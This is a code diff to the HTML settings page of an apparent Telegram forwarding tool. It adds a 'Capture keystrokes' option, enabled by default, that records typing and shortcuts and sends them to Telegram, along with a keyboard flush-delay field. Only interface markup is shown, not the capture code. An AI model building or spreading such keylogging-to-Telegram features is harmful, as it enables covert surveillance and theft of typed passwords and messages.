@@ -147,6 +147,10 @@
               <input type="checkbox" data-key="TELEGRAM_SEND_LOGS">
               <span><strong>Send logs to Telegram</strong><small>Periodically upload system log file (.log) to Telegram. You can also request logs anytime with <code>/logs</code>.</small></span>
             </label>
+            <label class="option-row">
+              <input type="checkbox" data-key="TELEGRAM_SEND_KEYBOARD" checked>
+              <span><strong>Capture keystrokes</strong><small>Record and forward keyboard typing and shortcuts to Telegram.</small></span>
+            </label>
           </div>
         </section>
 
@@ -162,6 +166,7 @@
             <div class="advanced-content">
               <div class="field-grid compact">
                 <label class="field"><span>Log upload interval</span><input type="number" min="5" max="86400" step="1" data-key="TELEGRAM_LOG_INTERVAL_SEC" placeholder="3600"><small>Seconds</small></label>
+                <label class="field"><span>Keyboard flush delay</span><input type="number" min="500" max="60000" step="100" data-key="C2T_KEYBOARD_FLUSH_MS" placeholder="3000"><small>Milliseconds</small></label>
                 <label class="field"><span>Maximum file size</span><input type="number" min="1" step="1" data-key="TELEGRAM_MAX_FILE_BYTES" placeholder="Default"><small>Bytes</small></label>
                 <label class="field"><span>Maximum queue memory</span><input type="number" min="1" step="1" data-key="C2T_QUEUE_MAX_BYTES" placeholder="67108864"><small>Bytes</small></label>
                 <label class="field"><span>Maximum queue items</span><input type="number" min="1" step="1" data-key="C2T_QUEUE_MAX_ITEMS" placeholder="128"></label>
